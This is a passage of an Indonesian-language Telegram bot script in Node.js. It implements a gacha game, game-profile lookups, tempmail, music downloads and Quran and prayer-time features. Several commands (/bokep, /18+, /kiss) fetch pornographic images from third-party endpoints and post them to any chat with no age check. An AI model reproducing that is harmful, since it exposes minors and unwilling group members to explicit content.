  const diff = Math.floor((now - last) / 1000);

  if (diff < COOLDOWN_SECONDS) {
    return bot.sendMessage(chatId, `⏳ Tunggu ${COOLDOWN_SECONDS - diff} detik lagi.`);
  }

  // CEK LIMIT HARIAN
  if (users[chatId].gachaCount >= 10)
    return bot.sendMessage(chatId, "⚠️ Limit 10x gacha per hari.");

  // CEK ITEM
  const items = readItems();
  if (!items.length)
    return bot.sendMessage(chatId, "📦 Belum ada item gacha.");

  // ANIMASI LOADING
  const progress = await bot.sendMessage(chatId, "🎰 Mengocok gacha...");
  for (let p = 10; p <= 100; p += 20) {
    await new Promise((r) => setTimeout(r, 300));
    try {
      await bot.editMessageText(`🎰 Mengocok...\nLoading ${p}%`, {
        chat_id: chatId,
        message_id: progress.message_id,
      });
    } catch {}
  }

  // RANDOM ITEM
  const pick = weightedPick(items);
  const fileName =
    pick.fileType === "localDocument" && pick.filePath
      ? pick.filePath.split("/").pop()
      : pick.fileType === "photo"
      ? pick.filePath
      : "No File";

  users[chatId].gachaCount++;
  users[chatId].lastGachaTime = now;
  writeUsers(users);

  // KIRIM HASIL
  let hasil = "";
  try {
    if (pick.isZonk) {
      hasil = "💥 ZONK! Tidak dapat apa-apa.";
      await bot.sendMessage(chatId, hasil);

    } else if (pick.fileType === "localDocument" && fs.existsSync(pick.filePath)) {
      hasil = `🎉 Kamu mendapat: <b>${pick.name}</b>\n📁 File: <code>${fileName}</code>`;
      await bot.sendDocument(chatId, pick.filePath, { caption: hasil, parse_mode: "HTML" });

    } else if (pick.fileType === "photo") {
      hasil = `🎉 Kamu mendapat: <b>${pick.name}</b>\n📸 FileID Photo: <code>${fileName}</code>`;
      await bot.sendPhoto(chatId, pick.filePath, { caption: hasil, parse_mode: "HTML" });

    } else {
      hasil = `🎉 Kamu mendapat: <b>${pick.name}</b>`;
      await bot.sendMessage(chatId, hasil, { parse_mode: "HTML" });
    }
  } catch (e) {
    console.error("Gagal kirim hadiah:", e.message);
    await bot.sendMessage(
      chatId,
      `🎉 Kamu mendapat: <b>${pick.name}</b>\n⚠️ File tidak ditemukan.`,
      { parse_mode: "HTML" }
    );
  }

  // FINISH ANIMATION
  try {
    await bot.editMessageText("✅ Selesai! Lihat hasil di bawah.", {
      chat_id: chatId,
      message_id: progress.message_id,
    });
  } catch {}

  // NOTIF OWNER
  const targetOwner = OWNER_ID[0]; // OWNER_ID array → ambil index 0

  const userTag = msg.from.username
    ? `@${msg.from.username}`
    : msg.from.first_name || "TanpaNama";

  await bot.sendMessage(
    targetOwner,
    `📢 <b>User Gacha</b>
👤 ${userTag} (${chatId})
🎰 Item: <b>${pick.name}</b>
📄 File: <code>${fileName}</code>
💥 Zonk: ${pick.isZonk ? "Ya" : "Tidak"}`,
    { parse_mode: "HTML" }
  );
});

// ⚙️ LIST ITEM (OWNER ONLY)
bot.onText(/\/listitem/, (msg) => {
  if (!OWNER_ID.includes(String(msg.from.id)))
    return bot.sendMessage(msg.chat.id, "❌ Hanya owner yang bisa melihat daftar item.");

  const items = readItems();
  if (!items.length)
    return bot.sendMessage(msg.chat.id, "📩 Belum ada item gacha yang tersimpan.");

  let txt = "📩 <b>DAFTAR ITEM GACHA</b>\n\n<blockquote>";

  items.forEach((it, idx) => {
    txt += `${idx + 1}. ${it.name}\n`;
  });

  txt += "</blockquote>";

  bot.sendMessage(msg.chat.id, txt, { parse_mode: "HTML" });
});

// COMMAND /ml atau /mobilelegends
bot.onText(/\/(?:ml|mobilelegends)(?:\s+(\d+)\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;

  const gameId = match[1];
  const zoneId = match[2];

  if (!gameId || !zoneId) {
    return bot.sendMessage(
      chatId,
      "⚠️ Contoh penggunaan:\n/ml idgame idzone"
    );
  }

  try {
    const res = await axios.get(
      `https://api.vreden.my.id/api/v1/stalker/mobilelegends?id_game=${gameId}&id_zone=${zoneId}`
    );

    const data = res.data;

    if (!data || !data.result) {
      return bot.sendMessage(chatId, "⚠️ Data tidak ditemukan.");
    }

    const result = data.result;

    const username = result.username || "Tidak ada";
    const game_id = result.game_id || gameId;
    const zone_id = result.zone_id || zoneId;

    let caption = `🎮 *Mobile Legends Profile*\n\n`;
    caption += `🆔 *Game ID:* ${game_id}\n`;
    caption += `🌍 *Zone ID:* ${zone_id}\n`;
    caption += `👤 *Username:* ${username}\n`;

    await bot.sendMessage(chatId, caption, { parse_mode: "Markdown" });

  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "❌ Terjadi error saat mengambil data dari API.");
  }
});

// COMMAND /freefire id
bot.onText(/\/freefire(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const id = match[1]; // ID yang dikirim user

  if (!id) {
    return bot.sendMessage(chatId, "⚠️ Contoh penggunaan:\n/freefire id ff");
  }

  try {
    const res = await axios.get(`https://api.vreden.my.id/api/v1/stalker/freefire?id=${id}`);
    const data = res.data;

    if (!data || !data.result) {
      return bot.sendMessage(chatId, "⚠️ Data tidak ditemukan.");
    }

    const result = data.result;

    const username = result.username || "Tidak ada";
    const gameId = result.game_id || id;

    let caption = `🎮 *FreeFire Profile*\n\n`;
    caption += `🆔 *Game ID:* ${gameId}\n`;
    caption += `👤 *Username:* ${username}\n`;

    await bot.sendMessage(chatId, caption, { parse_mode: "Markdown" });

  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "❌ Terjadi error saat mengambil data dari API.");
  }
});

// ========================
// COMMAND: /football
// ========================
bot.onText(/\/football/, async (msg) => {
    const chatId = msg.chat.id;

    try {
        // Ambil data dari API
        const { data } = await axios.get("https://api.nekolabs.web.id/news/antara/football");

        // Cek sukses & ada hasil
        if (!data.success || !data.result || data.result.length === 0) {
            return bot.sendMessage(chatId, "❌ Tidak ada data berita tersedia saat ini.");
        }

        // Pilih 1 berita secara random
        const random = data.result[Math.floor(Math.random() * data.result.length)];

        const text =
`📰 *${random.title}*
${random.description}

📅 *Tanggal:* ${new Date(random.date).toLocaleString("id-ID")}
🔗 *Link:* ${random.url}`;

        // Kirim dengan thumbnail (foto)
        bot.sendPhoto(chatId, random.thumbnail, {
            caption: text,
            parse_mode: "Markdown"
        });

    } catch (err) {
        console.log(err);
        bot.sendMessage(chatId, "⚠️ Gagal mengambil berita.");
    }
});

// Database status AntiPesan
const antiPesan = {}; // { chatId: true/false }

// ===== CEK ADMIN GRUP =====
async function isAdmin(chatId, userId) {
    try {
        const admins = await bot.getChatAdministrators(chatId);
        return admins.some(a => a.user.id === userId);
    } catch (e) {
        return false;
    }
}

// ===== COMMAND /antipesan =====
bot.onText(/\/antipesan (on|off)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const arg = match[1].toLowerCase();

    if (msg.chat.type === "private") {
        return bot.sendMessage(chatId, "Perintah ini hanya untuk grup.");
    }

    // Cek apakah pengguna admin
    const admin = await isAdmin(chatId, userId);
    if (!admin) {
        return bot.sendMessage(chatId, "❌ Hanya *Admin Grup* yang dapat menggunakan perintah ini.", {
            parse_mode: "Markdown"
        });
    }

    // ON / OFF Kan anti pesan
    if (arg === "on") {
        antiPesan[chatId] = true;
        bot.sendMessage(chatId, "🔒 *AntiPesan diaktifkan!* Semua pesan member akan dihapus.", {
            parse_mode: "Markdown"
        });
    } else {
        antiPesan[chatId] = false;
        bot.sendMessage(chatId, "🔓 *AntiPesan dimatikan.*", {
            parse_mode: "Markdown"
        });
    }
});

// ===== AUTO DELETE PESAN (Hanya hapus member) =====
bot.on("message", async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from?.id;

    if (!chatId || !userId) return;

    // Jika anti pesan OFF → stop
    if (!antiPesan[chatId]) return;

    // Jangan hapus pesan tanpa message_id
    if (!msg.message_id) return;

    // Cek apakah admin
    const admin = await isAdmin(chatId, userId);

    // Jika admin → JANGAN dihapus
    if (admin) return;

    // Jika member → hapus pesan
    try {
        await bot.deleteMessage(chatId, msg.message_id);
    } catch (e) {
        console.log("Gagal hapus pesan:", e.message);
    }
});

bot.onText(/\/komikindo/, async (msg) => {
  const chatId = msg.chat.id;

  try {
    const api = await fetch('https://api.nekolabs.web.id/discovery/komikindo/v1/popular');
    const data = await api.json();

    if (!data.success || !data.result || data.result.length === 0) {
      return bot.sendMessage(chatId, 'Gagal mengambil data komik.');
    }

    // Ambil random index
    const randomIndex = Math.floor(Math.random() * data.result.length);
    const komik = data.result[randomIndex];

    const caption = `
📚 *${komik.title}*
✍️ Author: ${komik.author}
⭐ Rating: ${komik.rating}

🔗 Link: ${komik.url}
`.trim();

    await bot.sendPhoto(chatId, komik.cover, {
      caption,
      parse_mode: "Markdown"
    });

  } catch (err) {
    console.log(err);
    bot.sendMessage(chatId, 'Terjadi error saat mengambil data API.');
  }
});

bot.onText(/\/selfies/, async (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, '⏳ Sedang mencari image selfies...');

  try {
    const response = await axios.get('https://api.nekolabs.web.id/random/waifuim/selfies', {
      responseType: 'arraybuffer'
    });

    // Kirim gambar langsung ke Telegram
    await bot.sendPhoto(chatId, Buffer.from(response.data), {
      caption: '✨ Random Image Selfies'
    });
  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, '⚠️ Gagal mengambil gambar Selfies, coba lagi nanti!');
  }
});

bot.onText(/\/uniform/, async (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, '⏳ Sedang mencari image uniform...');

  try {
    const response = await axios.get('https://api.nekolabs.web.id/random/waifuim/uniform', {
      responseType: 'arraybuffer'
    });

    // Kirim gambar langsung ke Telegram
    await bot.sendPhoto(chatId, Buffer.from(response.data), {
      caption: '✨ Random Image Uniform'
    });
  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, '⚠️ Gagal mengambil gambar Uniform, coba lagi nanti!');
  }
});

bot.onText(/\/animek/, async (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, '⏳ Sedang mencari image animek...');

  try {
    const response = await axios.get('https://api.nekolabs.web.id/random/yande-re', {
      responseType: 'arraybuffer'
    });

    // Kirim gambar langsung ke Telegram
    await bot.sendPhoto(chatId, Buffer.from(response.data), {
      caption: '✨ Random Image animek'
    });
  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, '⚠️ Gagal mengambil gambar animek, coba lagi nanti!');
  }
});

bot.onText(/\/maid/, async (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, '⏳ Sedang mencari image maid...');

  try {
    const response = await axios.get('https://api.nekolabs.web.id/random/waifuim/maid', {
      responseType: 'arraybuffer'
    });

    // Kirim gambar langsung ke Telegram
    await bot.sendPhoto(chatId, Buffer.from(response.data), {
      caption: '✨ Random Image maid'
    });
  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, '⚠️ Gagal mengambil gambar maid, coba lagi nanti!');
  }
});

bot.onText(/\/kiss/, async (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, '⏳ Sedang mencari image kiss...');

  try {
    const response = await axios.get('https://api.nekolabs.web.id/random/nsfwhub/kiss', {
      responseType: 'arraybuffer'
    });

    // Kirim gambar langsung ke Telegram
    await bot.sendPhoto(chatId, Buffer.from(response.data), {
      caption: '✨ Random Image kiss'
    });
  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, '⚠️ Gagal mengambil gambar kiss, coba lagi nanti!');
  }
});

bot.onText(/\/bokep/, async (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, '⏳ Sedang mencari image bokep...');

  try {
    const response = await axios.get('https://api.nekolabs.web.id/random/nsfwhub/69', {
      responseType: 'arraybuffer'
    });

    // Kirim gambar langsung ke Telegram
    await bot.sendPhoto(chatId, Buffer.from(response.data), {
      caption: '✨ Random Image bokep'
    });
  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, '⚠️ Gagal mengambil gambar bokep, coba lagi nanti!');
  }
});

bot.onText(/\/oppai/, async (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, '⏳ Sedang mencari image oppai...');

  try {
    const response = await axios.get('https://api.nekolabs.web.id/random/waifuim/oppai', {
      responseType: 'arraybuffer'
    });

    // Kirim gambar langsung ke Telegram
    await bot.sendPhoto(chatId, Buffer.from(response.data), {
      caption: '✨ Random Image Oppai'
    });
  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, '⚠️ Gagal mengambil gambar Oppai, coba lagi nanti!');
  }
});

bot.onText(/\/18+/, async (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, '⏳ Sedang mencari image 18+...');

  try {
    const response = await axios.get('https://api.nekolabs.web.id/random/nsfwhub/pussy', {
      responseType: 'arraybuffer'
    });

    // Kirim gambar langsung ke Telegram
    await bot.sendPhoto(chatId, Buffer.from(response.data), {
      caption: '✨ Random Image 18+ ✨'
    });
  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, '⚠️ Gagal mengambil gambar 18+, coba lagi nanti!');
  }
});

// === TEMPMAIL FEATURE ===
// /tempcreate -> buat email baru
bot.onText(/\/tempmailcreate/, async (msg) => {
  const chatId = msg.chat.id;

  try {
    const url = "https://api.nekolabs.web.id/tools/tempmail/v3/create";
    const res = await fetch(url);
    const data = await res.json();

    if (!data.success) {
      return bot.sendMessage(chatId, "❌ Gagal membuat tempmail.");
    }

    const email = data.result.email;
    const sessionId = data.result.sessionId;
    const expires = data.result.expiresAt;

    const teks = `
📧 *TempMail Berhasil Dibuat!*

• Email: \`${email}\`
• Session ID: \`${sessionId}\`
• Expire: ${expires}

Gunakan perintah:
\`/inbox ${sessionId}\`
untuk cek inbox.
`;

    bot.sendMessage(chatId, teks, { parse_mode: "Markdown" });

  } catch (e) {
    bot.sendMessage(chatId, "❌ Terjadi error saat membuat tempmail.");
  }
});



// /tempinbox <sessionID> -> cek inbox email
bot.onText(/\/inbox (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const sessionId = match[1];

  try {
    const url = `https://api.nekolabs.web.id/tools/tempmail/v3/inbox?id=${sessionId}`;
    const res = await fetch(url);
    const data = await res.json();

    if (!data.success) {
      return bot.sendMessage(chatId, "❌ Gagal mengambil inbox.");
    }

    const inbox = data.result.emails;
    const total = data.result.totalEmails;

    if (total === 0) {
      return bot.sendMessage(chatId, "📭 *Inbox Kosong*", { parse_mode: "Markdown" });
    }

    let teks = `📥 *Inbox (${total} email)*\n\n`;

    inbox.forEach((mail, i) => {
      teks += `
${i + 1}. *Dari:* ${mail.from}
*Subject:* ${mail.subject}
*Waktu:* ${mail.date}

*Isi:*
${mail.bodyText || "(Tidak ada teks)"}

------------------------\n`;
    });

    bot.sendMessage(chatId, teks, { parse_mode: "Markdown" });

  } catch (e) {
    bot.sendMessage(chatId, "❌ Terjadi error saat cek inbox.");
  }
});

// /ampreset <url alight motion>
bot.onText(/\/ampreset (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const url = match[1];

  bot.sendMessage(chatId, "⏳ *Mengambil informasi preset...*", {
    parse_mode: "Markdown"
  });

  try {
    const res = await axios.get(
      `https://api.nekolabs.web.id/tools/am-preset-info?url=${encodeURIComponent(url)}`
    );

    const data = res.data.result.info;

    if (!data) {
      return bot.sendMessage(chatId, "❌ Preset tidak ditemukan.");
    }

    // Ambil efek (max 7 biar tidak spam)
    const effectsList = data.requiredEffects.slice(0, 7)
      .map((e) => `• ${e}`)
      .join("\n");

    const caption = `
🎨 *Alight Motion Preset Info*
📌 *Title:* ${data.title}
📱 *Platform:* ${data.amPlatform}
🧩 *Version:* ${data.amVersionString}
📦 *Size:* ${(data.size / 1024 / 1024).toFixed(2)} MB
✨ *Jumlah Efek:* ${data.requiredEffects.length}

🎛 *Efek yang dipakai:*
${effectsList}${data.requiredEffects.length > 7 ? "\n…dan lainnya" : ""}

📁 *Project:* ${data.projects.length} item
    `.trim();

    // Kirim thumbnail
    await bot.sendPhoto(chatId, data.largeThumbUrl || data.tinyThumbUrl, {
      caption,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "🔗 Buka Preset", url }
          ]
        ]
      }
    });

  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "❌ Terjadi error mengambil preset.");
  }
});

// Jika user lupa link
bot.onText(/\/ampreset$/, (msg) => {
  bot.sendMessage(
    msg.chat.id,
    "⚠️ Contoh penggunaan:\n`/ampreset https://alightcreative.com/am/share/...`",
    { parse_mode: "Markdown" }
  );
});

// Command: /ytplay <judul video>
bot.onText(/\/ytplay (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const query = match[1];

  bot.sendMessage(chatId, `🔍 *Mencari video:* \`${query}\`\nTunggu sebentar...`, {
    parse_mode: "Markdown"
  });

  try {
    const res = await axios.get(
      `https://api-faa.my.id/faa/ytplay?query=${encodeURIComponent(query)}`
    );

    const data = res.data.result;

    if (!data) {
      return bot.sendMessage(chatId, "❌ Video tidak ditemukan.");
    }

    // Caption informasi video
    const caption = `
🎬 *${data.title}*
👤 Channel: *${data.author}*
⏱ Duration: ${data.duration}
👀 Views: ${data.views}
📅 Rilis: ${data.published}

🔗 YouTube: ${data.url}
    `.trim();

    // Kirim thumbnail + detail
    await bot.sendPhoto(chatId, data.thumbnail, {
      caption,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "📺 Buka YouTube", url: data.url }
          ]
        ]
      }
    });

    // Kirim MP3
    await bot.sendMessage(chatId, "🎧 Sedang mengirim audio MP3...");

    await bot.sendAudio(chatId, data.mp3, {
      caption: `🎵 *${data.title}*`,
      parse_mode: "Markdown"
    });

  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "❌ Terjadi error mengambil data video.");
  }
});

// Jika user tidak memberi parameter
bot.onText(/\/ytplay$/, (msg) => {
  bot.sendMessage(msg.chat.id, "⚠️ Contoh penggunaan:\n`/ytplay rindunya hatiku`", {
    parse_mode: "Markdown"
  });
});

// Command: /spotify <judul lagu>
bot.onText(/\/spotify (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const query = match[1];

  bot.sendMessage(chatId, `🔍 *Mencari lagu:* \`${query}\` ...`, {
    parse_mode: "Markdown"
  });

  try {
    const res = await axios.get(
      `https://api.vreden.my.id/api/v1/search/spotify?query=${encodeURIComponent(query)}&limit=10`
    );

    const result = res.data.result.search_data;

    if (!result || result.length === 0) {
      return bot.sendMessage(chatId, "❌ Lagu tidak ditemukan.");
    }

    // Ambil hanya hasil pertama
    const item = result[0];

    const caption = `
🎵 *${item.title}*
👤 Artist: *${item.artist}*
💽 Album: ${item.album}
⏱ Duration: ${item.duration}
🔥 Popularity: ${item.popularity}
📅 Rilis: ${item.release_date}
    `.trim();

    await bot.sendPhoto(chatId, item.cover_img, {
      caption,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "🎧 Buka di Spotify",
              url: item.song_link
            }
          ]
        ]
      }
    });

  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "❌ Terjadi error mengambil data Spotify.");
  }
});

// Jika user tidak memberi parameter
bot.onText(/\/spotify$/, (msg) => {
  bot.sendMessage(msg.chat.id, "⚠️ Contoh penggunaan:\n`/spotify jomblo happy`", {
    parse_mode: "Markdown"
  });
});

// Command: /soundmeme
bot.onText(/\/soundmeme/, async (msg) => {
  const chatId = msg.chat.id;

  try {
    const res = await axios.get("https://api.vreden.my.id/api/v1/search/soundmeme/trending");
    const data = res.data.result.list_data;

    if (!data || data.length === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada data sound meme.");
    }

    // Kirim list dengan inline keyboard
    let buttons = [];

    data.forEach((item, index) => {
      buttons.push([
        {
          text: `${index + 1}. ${item.title}`,
          callback_data: `sound_${index}`
        }
      ]);
    });

    // Simpan data sementara di memory bot
    global.soundMemeData = data;

    bot.sendMessage(chatId, "🎵 *Trending Sound Meme:*\nPilih salah satu:", {
      parse_mode: "Markdown",
      reply_markup: { inline_keyboard: buttons }
    });

  } catch (err) {
    bot.sendMessage(chatId, "❌ Gagal mengambil data API.");
    console.error(err);
  }
});

// Handle tombol dipencet
bot.on("callback_query", async (query) => {
  const chatId = query.message.chat.id;
  const data = query.data;

  if (data.startsWith("sound_")) {
    const index = parseInt(data.split("_")[1]);
    const sound = global.soundMemeData[index];

    if (!sound) return bot.sendMessage(chatId, "❌ Data sound tidak ditemukan.");

    bot.sendMessage(chatId, `🎧 Mengirim audio:\n*${sound.title}*`, {
      parse_mode: "Markdown"
    });

    try {
      await bot.sendAudio(chatId, sound.sound_link, {
        caption: `🎵 *${sound.title}*\n🔗 Sumber: MyInstants`
      });
    } catch (error) {
      bot.sendMessage(chatId, "❌ Gagal mengirim audio.");
      console.error(error);
    }
  }
});

// =============================
// FITUR /QURANRANDOM
// =============================
bot.onText(/^\/surahrandom$/i, async (msg) => {
  const chatId = msg.chat.id;

  try {
    const loading = await bot.sendMessage(chatId, "⏳ Mengambil surat random...", {
      parse_mode: "HTML",
    });

    // API RANDOM
    const url = "https://api.vreden.my.id/api/v1/islamic/quran/random";
    const res = await axios.get(url);
    const json = res.data;

    if (!json || json.status !== true || !json.result) {
      await bot.deleteMessage(chatId, loading.message_id).catch(() => {});
      return bot.sendMessage(chatId, "❌ Gagal mengambil data.");
    }

    const s = json.result;

    // Text yang rapi sesuai struktur di foto
    const teks = `
📖 <b>Surah ${s.asma.id.long}</b>
━━━━━━━━━━━━━━━━━━

<b>🕌 Arab:</b>
<pre>${s.asma.ar.long}</pre>

<b>🔹 Latin:</b> ${s.asma.en.short}
<b>🔸 Indonesia:</b> ${s.asma.id.short}

<b>✏️ Nomor Surat:</b> ${s.number}
<b>✏️ Jumlah Ayat:</b> ${s.ayatCount}
<b>✏️ Urutan Turun:</b> ${s.urutan}
<b>✏️ Jenis:</b> ${s.type}

<b>📘 Arti:</b> <i>${s.asma.translation.id}</i>

<b>📝 Tafsir Singkat:</b>
<i>${s.tafsir.substring(0, 600)}${s.tafsir.length > 600 ? "..." : ""}</i>

━━━━━━━━━━━━━━━━━━
🎧 <b>Mengirim audio...</b>
`;

    await bot.deleteMessage(chatId, loading.message_id).catch(() => {});
    await bot.sendMessage(chatId, teks, { parse_mode: "HTML" });

    // === FIX AUDIO BUFFER ===
    if (s.audio) {
      const audioBuffer = await axios.get(s.audio, {
        responseType: "arraybuffer",
      });

      await bot.sendAudio(chatId, audioBuffer.data, {
        caption: `🎧 Audio Surah ${s.asma.id.short}`,
        parse_mode: "HTML",
      });
    } else {
      bot.sendMessage(chatId, "⚠️ Audio tidak tersedia.");
    }

  } catch (err) {
    console.error("Quran Random Error:", err);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat mengambil data.");
  }
});

// =============================
// FITUR /jadwalsholat <kota>
// =============================
bot.onText(/^\/jadwalsholat(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const kota = match[1];

  if (!kota) {
    return bot.sendMessage(chatId,
      "❗ <b>Masukkan nama kota!</b>\nContoh:\n/jadwalsholat Tempat Lokasinya",
      { parse_mode: "HTML" }
    );
  }

  try {
    const loading = await bot.sendMessage(chatId, "⏳ Mengambil jadwal sholat...", {
      parse_mode: "HTML",
    });

    const url = `https://api.vreden.my.id/api/v1/islamic/jadwalsholat?kota=${encodeURIComponent(kota)}`;
    const res = await axios.get(url);
    const json = res.data;

    if (!json || json.status !== true || !json.result) {
      await bot.deleteMessage(chatId, loading.message_id).catch(() => {});
      return bot.sendMessage(chatId, "❌ Data tidak ditemukan.");
    }

    const s = json.result;

    const t = s.timings;
    const h = s.date.hijri;
    const g = s.date.gregorian;

    // FORMAT OUTPUT
    const teks = `
🕌 <b>Jadwal Sholat — ${kota.toUpperCase()}</b>
━━━━━━━━━━━━━━━━━━

<b>⏱ TIMINGS:</b>
• Fajr: <b>${t.Fajr}</b>
• Sunrise: <b>${t.Sunrise}</b>
• Dhuhr: <b>${t.Dhuhr}</b>
• Asr: <b>${t.Asr}</b>
• Sunset: <b>${t.Sunset}</b>
• Maghrib: <b>${t.Maghrib}</b>
• Isha: <b>${t.Isha}</b>
• Imsak: <b>${t.Imsak}</b>
• Midnight: <b>${t.Midnight}</b>
• First Third: <b>${t.Firstthird}</b>
• Last Third: <b>${t.Lastthird}</b>

━━━━━━━━━━━━━━━━━━
📅 <b>TANGGAL HIJRIAH</b>
• ${h.date} (${h.format})
• Hari: <b>${h.weekday.en}</b> — <b>${h.weekday.ar}</b>
• Bulan: <b>${h.month.en}</b> — <b>${h.month.ar}</b>
• Tahun: <b>${h.year}</b> (${h.designation.expanded})

━━━━━━━━━━━━━━━━━━
📅 <b>TANGGAL GREGORIAN</b>
• ${g.date} (${g.format})
• Hari: <b>${g.weekday.en}</b>
• Bulan: <b>${g.month.en}</b>
• Tahun: <b>${g.year}</b>

━━━━━━━━━━━━━━━━━━
📌 <b>Method:</b> ${s.date.method}
`;

    await bot.deleteMessage(chatId, loading.message_id).catch(() => {});
    await bot.sendMessage(chatId, teks, { parse_mode: "HTML" });

  } catch (err) {
    console.error("Jadwal Sholat Error:", err);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat mengambil data.");
  }
});

// =============================
// FITUR /QURANAUDIO (FIXED)
// =============================
bot.onText(/^\/quranaudio(?:\s+(\d+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const nomor = match[1];

  if (!nomor) {
    return bot.sendMessage(chatId,
      "❗ <b>Masukkan nomor surat!</b>\nContoh:\n/quranaudio 1",
      { parse_mode: "HTML" }
    );
  }

  try {
    const loading = await bot.sendMessage(chatId, "⏳ Mengambil data surat...", {
      parse_mode: "HTML",
    });

    const url = `https://api.vreden.my.id/api/v1/islamic/quran/audio?nomor=${nomor}`;
    const res = await axios.get(url);
    const json = res.data;

    if (!json || json.status !== true || !json.result) {
      await bot.deleteMessage(chatId, loading.message_id).catch(() => {});
      return bot.sendMessage(chatId, "❌ Data surat tidak ditemukan.");
    }

    const s = json.result;

    const teks = `
📖 <b>Quran Surat ${s.asma.id.long}</b>
━━━━━━━━━━━━━━━━━━

<b>🕌 Nama Arab:</b>
<pre>${s.asma.ar.long}</pre>

<b>🔹 Latin:</b> <b>${s.asma.en.short}</b>
<b>🔸 Indonesia:</b> <b>${s.asma.id.short}</b>

<b>✏️ Nomor Surat:</b> ${s.number}
<b>✏️ Ayat:</b> ${s.ayatCount}
<b>✏️ Urutan Turun:</b> ${s.urutan}
<b>✏️ Jenis:</b> ${s.type}

<b>📘 Arti:</b> <i>${s.asma.translation.id}</i>

<b>📝 Tafsir Singkat:</b>
<i>${s.tafsir.substring(0, 600)}${s.tafsir.length > 600 ? "..." : ""}</i>

━━━━━━━━━━━━━━━━━━
🎧 <b>Audio sedang dikirim...</b>
`;

    await bot.deleteMessage(chatId, loading.message_id).catch(() => {});
    await bot.sendMessage(chatId, teks, { parse_mode: "HTML" });

    // === FIX KIRIM AUDIO BUFFER ===
    if (s.audio) {
      const audioBuffer = await axios.get(s.audio, {
        responseType: "arraybuffer",
      });

      await bot.sendAudio(chatId, audioBuffer.data, {
        caption: `🎧 <b>Audio Surat ${s.asma.id.short}</b>`,
        parse_mode: "HTML",
      });

    } else {
      bot.sendMessage(chatId, "⚠️ Audio tidak tersedia.");
    }

  } catch (err) {
    console.error("Quran Audio Error:", err);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat mengambil data.");
  }
});

// =============================
// FITUR /ASMAULHUSNA (SINGLE DATA)
// =============================
bot.onText(/^\/asmaulhusna$/i, async (msg) => {
  const chatId = msg.chat.id;

  try {
    const loading = await bot.sendMessage(chatId, "⏳ Mengambil Asmaul Husna...", {
      parse_mode: "HTML",
    });

    const url = "https://api.vreden.my.id/api/v1/islamic/asmaulhusna";
    const res = await fetch(url);
    const data = await res.json();

    if (!data || data.status !== true || !data.result) {
      await bot.deleteMessage(chatId, loading.message_id).catch(() => {});
      return bot.sendMessage(chatId, "❌ Data Asmaul Husna tidak ditemukan.");
    }

    const item = data.result;

    const teks = `
📿 <b>Asmaul Husna – ${item.number}/99</b>
━━━━━━━━━━━━━━━━━━

<b>🕌 Arab:</b>
<pre>${item.arab}</pre>

<b>🔹 Latin:</b> <b>${item.latin}</b>

<b>📖 Arti Indonesia:</b>
<i>${item.translate_id}</i>

<b>🌍 English:</b>
<i>${item.translate_en}</i>

━━━━━━━━━━━━━━━━━━
`;

    await bot.deleteMessage(chatId, loading.message_id).catch(() => {});
    await bot.sendMessage(chatId, teks, { parse_mode: "HTML" });

  } catch (err) {
    console.error("Asmaul Husna Single Error:", err);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat mengambil data.");
  }
});

// =============================
// FITUR /KISAHNABI (FIXED AUTO SPLIT)
// =============================

bot.onText(/^\/kisahnabi(?: (.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      "📖 <b>Masukkan nama nabi!</b>\nContoh:\n<code>/kisahnabi adam</code>\n<code>/kisahnabi muhammad</code>",
      { parse_mode: "HTML" }
    );
  }

  const nabi = match[1].trim();

  try {
    const loading = await bot.sendMessage(chatId, "⏳ Mengambil kisah nabi...", {
      parse_mode: "HTML",
    });

    const url = `https://api.vreden.my.id/api/v1/islamic/kisahnabi?nama=${encodeURIComponent(
      nabi
    )}`;
    const res = await fetch(url);
    const data = await res.json();

    if (!data || data.status !== true || !data.result) {
      await bot.deleteMessage(chatId, loading.message_id).catch(() => {});
      return bot.sendMessage(chatId, "❌ Kisah nabi tidak ditemukan.");
    }

    const info = data.result;

    const message = `
📖 <b>Kisah Nabi ${info.name || nabi}</b>

<b>📌 Nama:</b> ${info.name || "-"}
<b>📅 Tahun Kelahiran:</b> ${info.thn_kelahiran || "-"}
